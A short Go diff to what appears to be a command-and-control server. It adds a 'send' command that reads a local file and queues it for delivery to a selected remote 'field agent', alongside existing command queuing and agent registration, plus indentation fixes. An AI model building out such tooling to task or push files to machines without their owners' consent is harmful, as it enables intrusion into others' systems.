@@ -43,6 +43,23 @@ func cliHandler() {
 				showHandler(separatedCommand)
 			case "select":
 				selectHandler(separatedCommand)
+			case "send":
+				if len(separatedCommand) > 1 && selectedAgent != "" {
+					var err error
+					// Send file to selected agent
+					fileToSend := &structures.File{}
+					fileToSend.FileName = separatedCommand[1]
+					fileToSend.FileData, err = os.ReadFile(fileToSend.FileName)
+					if err != nil {
+						log.Println("Error reading file: ", err)
+					} else {
+						fieldAgents[fieldAgentPosition(selectedAgent)].File = *fileToSend
+					}
+
+				} else {
+					log.Println("Specify the file to send")
+				}
+				//case "get":
 			default:
 				if selectedAgent != "" {
 					// Send command to selected agent
@@ -153,9 +170,9 @@ func startListener(port string) {
 						}
 					}
 					// Send queued commands to agent
-				gob.NewEncoder(channel).Encode(fieldAgents[fieldAgentPosition(message.AgentId)])
-				// Clear the agent queued commands
-				fieldAgents[fieldAgentPosition(message.AgentId)].Commands = []structures.Commands{}
+					gob.NewEncoder(channel).Encode(fieldAgents[fieldAgentPosition(message.AgentId)])
+					// Clear the agent queued commands
+					fieldAgents[fieldAgentPosition(message.AgentId)].Commands = []structures.Commands{}
 				} else {
 					log.Println("New connection: ", channel.RemoteAddr())
 					log.Println("Registering Agent: ", message.AgentId)
@@ -163,7 +180,6 @@ func startListener(port string) {
 					gob.NewEncoder(channel).Encode(message)
 				}
 
-				
 			}
 
 		}
